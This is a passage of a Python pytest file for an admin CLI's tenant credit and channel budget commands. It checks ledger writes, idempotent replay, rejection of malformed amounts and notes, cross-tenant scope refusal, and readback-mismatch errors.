    assert rows[0].delta_usd == balance == Decimal(normalized)
    assert rows[0].reason == "manual_credit" and rows[0].channel_id is None
    assert receipt.observations["ledger_entry"] == rows[0].model_dump(mode="json")
    assert again.observations["ledger_entry"] == receipt.observations["ledger_entry"]
    assert receipt.observations["balance_usd"] == str(balance)
    assert not foreign_rows and not binding.trace.requests


async def test_credit_without_id_returns_the_actual_cli_uuid_for_replay(
    binding: AdminBindings,
) -> None:
    command = "daimon tenants credit discord {guild_id} 1 --note qa-default-id"
    receipt = await invoke(binding, command)
    request_id = receipt.observations["credit_id"]
    assert isinstance(request_id, str) and str(uuid.UUID(request_id)) == request_id
    again = await invoke(binding, f"{command} --id {request_id}")
    assert again.status == "executed" and again.observations["inserted"] is False
    assert again.observations["ledger_entry"] == receipt.observations["ledger_entry"]
    assert not binding.trace.requests


@pytest.mark.parametrize(
    "arguments",
    [
        "0 --note qa",
        "-1 --note qa",
        "NaN --note qa",
        "sNaN --note qa",
        "Infinity --note qa",
        "-Infinity --note qa",
        "1.001 --note qa",
        "-<balance> --note qa",
        "wat --note qa",
        "1",
        '1 --note ""',
        '1 --note "   "',
        "1 --note ---",
        "1 --note ___",
        "1 --note qa --id first --id second",
        "1 --note qa --debit true",
    ],
)
async def test_non_cli_credit_shapes_remain_pending_without_ledger_writes(
    binding: AdminBindings, arguments: str
) -> None:
    receipt = await invoke(binding, f"daimon tenants credit discord {{guild_id}} {arguments}")
    assert receipt.status == "pending"
    async with binding.sessions() as session:
        rows = await tenant_ledger.list_for_tenant(
            session, tenant_id=uuid.UUID(binding.scope.tenant_id)
        )
    assert not rows and not binding.trace.requests


async def test_foreign_credit_destination_refuses_without_funding_either_tenant(
    binding: AdminBindings,
) -> None:
    foreign = await provision_tenant(
        binding.sessions, platform="discord", workspace_id="823456789012345678"
    )
    with pytest.raises(ScopeViolation):
        await invoke(binding, "daimon tenants credit discord 823456789012345678 1 --note qa")
    async with binding.sessions() as session:
        for tenant_id in (uuid.UUID(binding.scope.tenant_id), foreign.tenant_id):
            assert not await tenant_ledger.list_for_tenant(session, tenant_id=tenant_id)
    assert not binding.trace.requests


async def test_credit_missing_readback_cannot_issue_executed_receipt(
    binding: AdminBindings, monkeypatch: pytest.MonkeyPatch
) -> None:
    from unittest.mock import AsyncMock

    real_read = tenant_ledger.list_for_tenant
    monkeypatch.setattr(tenant_ledger, "list_for_tenant", AsyncMock(return_value=[]))
    with pytest.raises(RuntimeError, match="credit readback differs"):
        await invoke(binding, "daimon tenants credit discord {guild_id} 1 --note qa --id readback")
    async with binding.sessions() as session:
        rows = await real_read(session, tenant_id=uuid.UUID(binding.scope.tenant_id))
    assert len(rows) == 1 and rows[0].reason == "manual_credit"
    assert not binding.trace.requests


@pytest.mark.parametrize("fault", ["missing_set", "wrong_limit", "stale_clear"])
async def test_budget_readback_failure_cannot_issue_executed_receipt(
    binding: AdminBindings, monkeypatch: pytest.MonkeyPatch, fault: str
) -> None:
    from unittest.mock import AsyncMock

    await invoke(
        binding, "daimon channels budget set discord {guild_id} {channel_id} 0.01 --window total"
    )
    real_read = channel_budgets.get_channel_budget
    async with binding.sessions() as session:
        persisted = await real_read(
            session,
            tenant_id=uuid.UUID(binding.scope.tenant_id),
            platform="discord",
            channel_id=min(binding.channels),
        )
    assert persisted is not None
    corrupted = (
        None
        if fault == "missing_set"
        else persisted.model_copy(update={"limit_usd": Decimal("999")})
        if fault == "wrong_limit"
        else persisted
    )
    monkeypatch.setattr(channel_budgets, "get_channel_budget", AsyncMock(return_value=corrupted))
    command = (
        "daimon channels budget clear discord {guild_id} {channel_id}"
        if fault == "stale_clear"
        else "daimon channels budget set discord {guild_id} {channel_id} 0.01 --window total"
    )
    with pytest.raises(RuntimeError, match="budget readback differs"):
        await invoke(binding, command)
    async with binding.sessions() as session:
        actual = await real_read(
            session,
            tenant_id=uuid.UUID(binding.scope.tenant_id),
            platform="discord",
            channel_id=min(binding.channels),
        )
    assert (actual is None) == (fault == "stale_clear")
    assert not binding.trace.requests
